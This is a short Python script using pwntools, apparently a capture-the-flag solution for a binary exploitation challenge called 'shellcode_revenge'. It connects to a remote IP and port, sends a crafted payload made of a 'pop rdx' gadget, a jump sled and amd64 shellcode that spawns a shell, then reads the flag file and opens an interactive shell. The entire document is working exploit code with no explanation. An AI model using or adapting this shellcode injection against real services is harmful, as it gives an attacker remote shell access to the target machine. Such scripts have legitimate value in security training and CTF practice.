from pwn import *
import time
context.arch = 'amd64'
local = False
if local:
    r = process('./shellcode_revenge')
else:
    r = remote('140.115.59.7', 11004)

sh = asm(shellcraft.amd64.linux.sh())
pop = asm('pop rdx')
addr = 0x601059 - 0x400644
# payload = asm('mov rax, 0x0')
payload = asm('lab: ret\n' + 'ret\n' * addr + 'jmp lab')[-5:]

r.sendline(pop + payload + sh)
r.sendline('cat /home/shellcode_revenge/flag')
r.interactive()
